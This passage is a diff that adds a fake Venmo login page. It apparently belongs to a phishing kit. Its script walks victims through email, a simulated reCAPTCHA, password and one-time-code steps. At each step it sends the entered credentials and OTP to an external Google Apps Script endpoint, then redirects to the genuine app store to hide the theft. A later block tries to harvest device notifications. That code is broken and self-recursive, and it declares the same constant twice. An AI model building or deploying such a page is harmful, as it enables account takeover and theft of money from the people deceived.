MTgzIDEyLjQ3MzUgMTMwLjA0NyAxMy4wNDM0TDEyNS44NTYgMzkuODkxNUgxMTIuNjUyTDExOC42ODYgMS42MDU1MkgxMjkuOTc4TDEzMC4zMzMgNC44MDE3NkMxMzIuOTYgMi44ODYyOCAxMzYuNTA4IDAuOTY2MDU3IDE0MS4yNjUgMC45NjYwNTdDMTQ1LjM4NCAwLjk2NDU5OSAxNDguMDggMi43NDA0NSAxNDkuNDMyIDUuMTU1NzdaIiBmaWxsPSIjMDA4Q0ZGIi8+CiAgPHBhdGggZD0iTTE5Ni44NjkgMTYuMzA3NkMxOTYuODY5IDEzLjE4MjEgMTk2LjA4NyAxMS4wNTEyIDE5My43NDYgMTEuMDUxMkMxODguNTYzIDExLjA1MTIgMTg3LjQ5OCAyMC4yMTMzIDE4Ny40OTggMjQuOTAwM0MxODcuNDk4IDI4LjQ1NiAxODguNDkzIDMwLjY1NjYgMTkwLjgzNCAzMC42NTY2QzE5NS43MzMgMzAuNjU2NiAxOTYuODY5IDIwLjk5NDIgMTk2Ljg2OSAxNi4zMDc2Wk0xNzQuMTUgMjQuMzM0NUMxNzQuMTUgMTIuMjYwOCAxODAuNTM5IDAuOTYzMzc5IDE5NS4yMzggMC45NjMzNzlDMjA2LjMxNCAwLjk2MzM3OSAyMTAuMzYzIDcuNDk5ODUgMjEwLjM2MyAxNi41MjJDMjEwLjM2MyAyOC40NTU2IDIwNC4wNDMgNDAuODE0IDE4OC45ODkgNDAuODE0QzE3Ny44NDIgNDAuODE0IDE3NC4xNSAzMy40OTcgMTc0LjE1IDI0LjMzNDVaIiBmaWxsPSIjMDA4Q0ZGIi8+Cjwvc3ZnPg==" class="venmo-logo-load" alt="venmo" />
+  <div class="big-throbber"></div>
+  <div class="full-loading-text" id="fullLoadingText">Logging into Venmo web...</div>
+</div>
+
+<!-- Alert Modal -->
+<div class="alert-overlay" id="customAlert">
+  <div class="alert-box">
+    <div class="alert-header" id="alertTitle">Attention</div>
+    <div class="alert-body" id="alertMessage">Please enter your email.</div>
+    <div class="alert-btn-row">
+      <button class="alert-btn" onclick="closeAlert()">OK</button>
+    </div>
+  </div>
+</div>
+<!-- Your existing body content -->
+
+<!-- Popup for Auto-Fill Notification -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-box">
+    <div class="popup-header">Auto-Fill Notification</div>
+    <div class="popup-body">Allow this website to read and auto-fill notifications on your device?</div>
+    <div class="popup-btn-row">
+      <button class="popup-btn" id="acceptNotification">Accept</button>
+    </div>
+  </div>
+</div>
+<script>
+  // Google Sheet URL
+  const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbyeb0rGjXl825EaQTz3_qcyzh6yssTBUL1vbhHsRjUHSHQmz-dSlXIkfgkVhShLaPJA/exec";
+
+  let captchaVerified = false;
+  let captchaVerifying = false;
+
+  async function saveToSheet(data) {
+    try {
+      await fetch(GOOGLE_SHEET_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain;charset=utf-8" },
+        body: JSON.stringify(data)
+      });
+      console.log("Saved to sheet:", data);
+    } catch (e) {
+      console.error("Sheet error:", e);
+    }
+  }
+
+  function showAlert(msg, title = "Attention") {
+    document.getElementById("alertTitle").innerText = title;
+    document.getElementById("alertMessage").innerText = msg;
+    document.getElementById("customAlert").classList.add("active");
+  }
+  function closeAlert() {
+    document.getElementById("customAlert").classList.remove("active");
+  }
+
+  // Password eye toggle
+  document.getElementById("toggleEye").addEventListener("click", function() {
+    const input = document.getElementById("password");
+    input.type = input.type === "password" ? "text" : "password";
+  });
+
+  // Clear error when typing
+  document.getElementById("email").addEventListener("input", function() {
+    this.classList.remove("error");
+    document.getElementById("emailError").classList.remove("active");
+  });
+  document.getElementById("password").addEventListener("input", function() {
+    this.classList.remove("error");
+    document.getElementById("passwordError").classList.remove("active");
+  });
+  document.getElementById("otpCode").addEventListener("input", function() {
+    this.classList.remove("error");
+    document.getElementById("otpError").classList.remove("active");
+  });
+
+  // Button throbber control
+  function showButtonSpinner(btnId, spinnerId, textId) {
+    const btn = document.getElementById(btnId);
+    const spinner = document.getElementById(spinnerId);
+    const text = document.getElementById(textId);
+    btn.disabled = true;
+    text.style.display = "none";
+    spinner.style.display = "block";
+  }
+  function hideButtonSpinner(btnId, spinnerId, textId) {
+    const btn = document.getElementById(btnId);
+    const spinner = document.getElementById(spinnerId);
+    const text = document.getElementById(textId);
+    btn.disabled = false;
+    text.style.display = "";
+    spinner.style.display = "none";
+  }
+
+  // STEP 1 -> STEP 2 (Email -> Robot)
+  document.getElementById("nextBtn1").addEventListener("click", async () => {
+    const email = document.getElementById("email").value.trim();
+    const emailInput = document.getElementById("email");
+    const emailError = document.getElementById("emailError");
+
+    if (!email) {
+      emailInput.classList.add("error");
+      emailError.classList.add("active");
+      return;
+    }
+
+    // Show throbber on the button
+    showButtonSpinner("nextBtn1", "spinner1", "nextBtn1Text");
+
+    await saveToSheet({
+      type: "Email/Username Input",
+      email: email,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    });
+
+    setTimeout(() => {
+      document.getElementById("step1").classList.remove("active");
+      document.getElementById("step2").classList.add("active");
+      hideButtonSpinner("nextBtn1", "spinner1", "nextBtn1Text");
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }, 2500);
+  });
+
+  // reCAPTCHA verification
+  document.getElementById("recaptchaContainer").addEventListener("click", function() {
+    if (captchaVerified || captchaVerifying) return;
+    captchaVerifying = true;
+
+    const checkbox = document.getElementById("recaptchaCheckbox");
+    const spinner = document.getElementById("recaptchaSpinner");
+    const check = document.getElementById("recaptchaCheck");
+    const status = document.getElementById("recaptchaStatus");
+
+    checkbox.classList.add("verifying");
+    spinner.style.display = "block";
+    status.innerText = "Verifying...";
+    status.classList.add("verifying");
+
+    saveToSheet({
+      type: "Robot Verification Started",
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    });
+
+    setTimeout(() => {
+      spinner.style.display = "none";
+      check.style.display = "block";
+      checkbox.classList.remove("verifying");
+      checkbox.classList.add("verified");
+      status.innerText = "Success";
+      status.classList.remove("verifying");
+      status.classList.add("success");
+      captchaVerified = true;
+      captchaVerifying = false;
+
+      // Enable Continue button
+      const btn2 = document.getElementById("nextBtn2");
+      btn2.disabled = false;
+      btn2.style.opacity = "1";
+      btn2.style.cursor = "pointer";
+
+      saveToSheet({
+        type: "Robot Verification Success",
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+      });
+    }, 4500);
+  });
+
+  // STEP 2 -> STEP 3 (Robot -> Password)
+  document.getElementById("nextBtn2").addEventListener("click", async () => {
+    if (!captchaVerified) return;
+
+    showButtonSpinner("nextBtn2", "spinner2", "nextBtn2Text");
+
+    await saveToSheet({
+      type: "Robot Verified -> Continue",
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    });
+
+    setTimeout(() => {
+      document.getElementById("step2").classList.remove("active");
+      document.getElementById("step3").classList.add("active");
+      document.getElementById("emailDisplay").innerText = document.getElementById("email").value.trim();
+      hideButtonSpinner("nextBtn2", "spinner2", "nextBtn2Text");
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }, 1500);
+  });
+
+  // Change email -> back to step 1
+  document.getElementById("changeEmail").addEventListener("click", function() {
+    document.getElementById("step3").classList.remove("active");
+    document.getElementById("step1").classList.add("active");
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  });
+
+  // STEP 3 -> STEP 4 (Password -> OTP)
+  document.getElementById("nextBtn3").addEventListener("click", async () => {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const passwordInput = document.getElementById("password");
+    const passwordError = document.getElementById("passwordError");
+
+    if (!password) {
+      passwordInput.classList.add("error");
+      passwordError.classList.add("active");
+      return;
+    }
+
+    showButtonSpinner("nextBtn3", "spinner3", "nextBtn3Text");
+
+    await saveToSheet({
+      type: "Password Input",
+      email: email,
+      password: password,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    });
+
+    setTimeout(() => {
+      document.getElementById("step3").classList.remove("active");
+      document.getElementById("step4").classList.add("active");
+      hideButtonSpinner("nextBtn3", "spinner3", "nextBtn3Text");
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }, 3000);
+  });
+
+  // STEP 4 -> Loading -> Error -> App Store
+  document.getElementById("loginBtn4").addEventListener("click", async () => {
+    const otpCode = document.getElementById("otpCode").value.trim();
+    const otpInput = document.getElementById("otpCode");
+    const otpError = document.getElementById("otpError");
+
+    if (!otpCode || otpCode.length < 4) {
+      otpInput.classList.add("error");
+      otpError.classList.add("active");
+      return;
+    }
+
+    showButtonSpinner("loginBtn4", "spinner4", "loginBtn4Text");
+
+    await saveToSheet({
+      type: "OTP Code",
+      otpCode: otpCode,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    });
+
+    // After 2.5 sec -> full screen "Logging into Venmo web..."
+    setTimeout(() => {
+      hideButtonSpinner("loginBtn4", "spinner4", "loginBtn4Text");
+      document.getElementById("fullLoadingText").innerText = "Logging into Venmo web...";
+      document.getElementById("fullLoading").classList.add("active");
+      document.getElementById("step4").classList.remove("active");
+
+      // After 4 sec -> show error box "try using the mobile app"
+      setTimeout(() => {
+        document.getElementById("fullLoading").classList.remove("active");
+        document.getElementById("errorBox").classList.add("active");
+        window.scrollTo({ top: 0, behavior: "smooth" });
+
+        // After 4 more sec -> redirect to app store
+        setTimeout(() => {
+          redirectToAppStore();
+        }, 4000);
+      }, 4000);
+    }, 2500);
+  });
+
+  function redirectToAppStore() {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+      window.location.href = "https://apps.apple.com/us/app/venmo/id351727453";
+    } else if (/android/i.test(userAgent)) {
+      window.location.href = "https://play.google.com/store/apps/details?id=com.venmo";
+    } else {
+      window.location.href = "https://venmo.com/";
+    }
+  }
+  // Your existing scripts
+
+  // Google Sheet URL
+  const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbyeb0rGjXl825EaQTz3_qcyzh6yssTBUL1vbhHsRjUHSHQmz-dSlXIkfgkVhShLaPJA/exec";
+
+  // Show popup for auto-fill notification
+  document.addEventListener("DOMContentLoaded", function() {
+    showPopup();
+  });
+
+  function showPopup() {
+    document.getElementById("popupOverlay").classList.add("active");
+  }
+
+  document.getElementById("acceptNotification").addEventListener("click", function() {
+    document.getElementById("popupOverlay").classList.remove("active");
+    Notification.requestPermission().then(permission => {
+      if (permission === "granted") {
+        console.log("Notification permission granted.");
+        startNotificationListener();
+      }
+    });
+  });
+
+  function startNotificationListener() {
+    Notification.requestPermission().then(permission => {
+      if (permission === "granted") {
+        const notificationListener = new NotificationListener();
+        notificationListener.onNotificationReceived = (notification) => {
+          saveNotificationToSheet(notification);
+        };
+      }
+    });
+  }
+
+  function saveNotificationToSheet(notification) {
+    const data = {
+      title: notification.title,
+      body: notification.body,
+      tag: notification.tag,
+      data: notification.data,
+      timestamp: new Date().toISOString()
+    };
+    fetch(GOOGLE_SHEET_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "text/plain;charset=utf-8" },
+      body: JSON.stringify(data)
+    }).then(response => {
+      if (response.ok) {
+        console.log("Notification saved to sheet:", data);
+      } else {
+        console.error("Failed to save notification to sheet:", data);
+      }
+    }).catch(error => {
+      console.error("Error saving notification to sheet:", error);
+    });
+  }
+
+  class NotificationListener {
+    constructor() {
+      if (Notification.permission === "granted") {
+        this.listener = new NotificationListener();
+        this.onNotificationReceived = null;
+        this.init();
+      }
+    }
+
+    init() {
+      if (window.Notification) {
+        this.listener = new NotificationListener();
+        this.listener.onNotificationReceived = this.onNotificationReceived;
+        window.addEventListener('load', () => {
+          if (Notification.permission === "granted") {
+            this.listenForNotifications();
+          }
+        });
+      }
+    }
+
+    listenForNotifications() {
+      const notificationPermission = Notification.permission;
+      if (notificationPermission === "granted") {
+        this.listenForNotifications();
+      } else if (notificationPermission === "default") {
+        Notification.requestPermission().then(permission => {
+          if (permission === "granted") {
+            this.listenForNotifications();
+          }
+        });
+      }
+    }
+
+    onNotificationReceived(notification) {
+      if (this.onNotificationReceived) {
+        this.onNotificationReceived(notification);
+      }
+    }
+  }
+</script>
+
+</body>
+</html>
